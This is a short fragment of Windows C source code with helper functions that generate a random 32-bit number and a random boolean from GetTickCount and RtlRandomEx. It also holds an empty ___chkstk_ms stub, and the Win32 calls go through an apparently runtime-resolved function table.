 * @return
 */
ULONG RandomNumber32(
    VOID
) {
    ULONG Seed = 0;

    Seed = Instance.Win32.GetTickCount();
    Seed = Instance.Win32.RtlRandomEx( &Seed );
    Seed = Instance.Win32.RtlRandomEx( &Seed );
    Seed = ( Seed % ( LONG_MAX - 2 + 1 ) ) + 2;

    return Seed % 2 == 0 ? Seed : Seed + 1;
}

/*!
 * generates a random bool
 * @return
 */
BOOL RandomBool(
    VOID
) {
    ULONG Seed = 0;

    Seed = Instance.Win32.GetTickCount();
    Seed = Instance.Win32.RtlRandomEx( &Seed );

    return Seed % 2 == 0 ? TRUE : FALSE;
}

VOID volatile ___chkstk_ms(
    VOID
) { __asm__( "nop" ); }
